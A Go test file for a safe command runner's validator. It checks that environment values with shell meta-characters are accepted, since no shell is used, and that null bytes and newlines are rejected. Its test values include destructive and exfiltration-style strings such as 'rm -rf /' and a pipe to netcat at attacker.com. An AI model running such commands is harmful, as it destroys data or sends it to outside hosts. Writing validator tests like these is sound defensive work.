package security

import (
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/security"

	"github.com/stretchr/testify/require"
)

// TestEnvironmentVariableInjection_CommandInjection tests the environment variable value
// validation behavior (AC-M4-2, AC-M4-3).
//
// Commands are executed directly (not via a shell), so shell meta-characters such as
// ; | $( > < carry no injection risk. Only control characters (\0, \n, \r) are rejected
// because they can corrupt structured output or inject headers.
func TestEnvironmentVariableInjection_CommandInjection(t *testing.T) {
	tests := []struct {
		name     string
		envKey   string
		envValue string
		wantErr  bool
		reason   string
	}{
		// Shell meta-characters: allowed because no shell is involved
		{
			name:     "Value with command separator",
			envKey:   "MY_VAR",
			envValue: "normal; rm -rf /",
			wantErr:  false,
			reason:   "Semicolon is harmless when command runs without a shell",
		},
		{
			name:     "Value with pipe",
			envKey:   "MY_VAR",
			envValue: "data | nc attacker.com 1234",
			wantErr:  false,
			reason:   "Pipe is harmless when command runs without a shell",
		},
		{
			name:     "Value with command substitution",
			envKey:   "MY_VAR",
			envValue: "prefix$(malicious_command)",
			wantErr:  false,
			reason:   "Command substitution syntax is harmless when no shell is invoked",
		},
		{
			name:     "Value with backticks",
			envKey:   "MY_VAR",
			envValue: "prefix`malicious_command`",
			wantErr:  false,
			reason:   "Backtick substitution syntax is harmless when no shell is invoked",
		},
		{
			name:     "Value with && operator",
			envKey:   "MY_VAR",
			envValue: "normal && malicious",
			wantErr:  false,
			reason:   "AND operator is harmless when command runs without a shell",
		},
		{
			name:     "Value with || operator",
			envKey:   "MY_VAR",
			envValue: "normal || malicious",
			wantErr:  false,
			reason:   "OR operator is harmless when command runs without a shell",
		},
		{
			name:     "Value with redirect",
			envKey:   "MY_VAR",
			envValue: "data > /tmp/output",
			wantErr:  false,
			reason:   "Redirect is harmless when command runs without a shell",
		},
		{
			name:     "Value with rm command text",
			envKey:   "MY_VAR",
			envValue: "prefix rm -rf /tmp",
			wantErr:  false,
			reason:   "Text containing 'rm' is harmless as a variable value",
		},
		// Control characters: rejected (can corrupt structured output / inject headers)
		{
			name:     "Value with null byte",
			envKey:   "MY_VAR",
			envValue: "value\x00suffix",
			wantErr:  true,
			reason:   "Null byte can truncate strings and corrupt structured output",
		},
		{
			name:     "Value with newline",
			envKey:   "MY_VAR",
			envValue: "value\nsuffix",
			wantErr:  true,
			reason:   "Newline can inject additional log lines or headers",
		},
		{
			name:     "Value with carriage return",
			envKey:   "MY_VAR",
			envValue: "value\rsuffix",
			wantErr:  true,
			reason:   "Carriage return can corrupt structured output",
		},
		// Safe values
		{
			name:     "Safe library path",
			envKey:   "LD_PRELOAD",
			envValue: "/usr/lib/libtest.so",
			wantErr:  false,
			reason:   "Simple path is accepted",
		},
		{
			name:     "Safe PATH value",
			envKey:   "PATH",
			envValue: "/usr/local/bin:/usr/bin:/bin",
			wantErr:  false,
			reason:   "Standard PATH is accepted",
		},
		{
			name:     "Safe HOME value",
			envKey:   "HOME",
			envValue: "/home/testuser",
			wantErr:  false,
			reason:   "Simple directory path is accepted",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create security validator with default config
			validator, err := security.NewValidator(nil)
			require.NoError(t, err, "Failed to create security validator")

			// Test environment variable value validation
			err = validator.ValidateEnvironmentValue(tt.envKey, tt.envValue)

			if tt.wantErr {
				require.Error(t, err, "Validation should reject %s=%q: %s",
					tt.envKey, tt.envValue, tt.reason)
			} else {
				require.NoError(t, err, "Validation should accept %s=%q: %s",
					tt.envKey, tt.envValue, tt.reason)
			}
		})
	}
}

// TestEnvironmentVariableInjection_SafeValues tests that safe environment
// variables are properly handled
func TestEnvironmentVariableInjection_SafeValues(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err, "Failed to create security validator")

	safeEnvVars := map[string]string{
		"HOME":     "/home/testuser",
		"USER":     "testuser",
		"LANG":     "en_US.UTF-8",
		"LC_ALL":   "en_US.UTF-8",
		"TZ":       "UTC",
		"TMPDIR":   "/tmp",
		"TERM":     "xterm-256color",
		"EDITOR":   "vim",
		"SHELL":    "/bin/bash",
		"HOSTNAME": "testhost",
	}

	for key, value := range safeEnvVars {
		t.Run(key, func(t *testing.T) {
			err := validator.ValidateEnvironmentValue(key, value)
			// Note: Validation may still fail based on allowlist configuration
			// This test documents current behavior - not asserting success/failure
			// as it depends on the validator configuration
			if err != nil {
				t.Skipf("Validation for %s=%s rejected (may be intentional based on allowlist): %v",
					key, value, err)
			}
		})
	}
}

// TestEnvironmentVariableInjection_AllEnvironmentVars tests validation of
// a complete environment variable set. Shell meta-chars are allowed; only
// control characters (\0, \n, \r) cause rejection.
func TestEnvironmentVariableInjection_AllEnvironmentVars(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name    string
		envVars map[string]string
		wantErr bool
		reason  string
	}{
		{
			name: "Clean environment",
			envVars: map[string]string{
				"HOME": "/home/user",
				"PATH": "/usr/local/bin:/usr/bin:/bin",
				"USER": "testuser",
			},
			wantErr: false,
			reason:  "All variables have safe values",
		},
		{
			name: "Environment with shell metachar in PATH",
			envVars: map[string]string{
				"HOME": "/home/user",
				"PATH": "/usr/bin; rm -rf /",
				"USER": "testuser",
			},
			wantErr: false,
			reason:  "Shell metachar in PATH is allowed (no shell involved in execution)",
		},
		{
			name: "Environment with command substitution syntax",
			envVars: map[string]string{
				"HOME":   "/home/user",
				"CONFIG": "normal$(malicious)",
			},
			wantErr: false,
			reason:  "Command substitution syntax is harmless without a shell",
		},
		{
			name: "Environment with null byte",
			envVars: map[string]string{
				"VAR1": "data\x00null",
			},
			wantErr: true,
			reason:  "Null byte is rejected",
		},
		{
			name: "Environment with newline injection",
			envVars: map[string]string{
				"VAR1": "line1\ninjected",
			},
			wantErr: true,
			reason:  "Newline is rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateAllEnvironmentVars(tt.envVars)

			if tt.wantErr {
				require.Error(t, err, "Validation should reject environment: %s", tt.reason)
			} else {
				require.NoError(t, err, "Validation should accept environment: %s", tt.reason)
			}
		})
	}
}
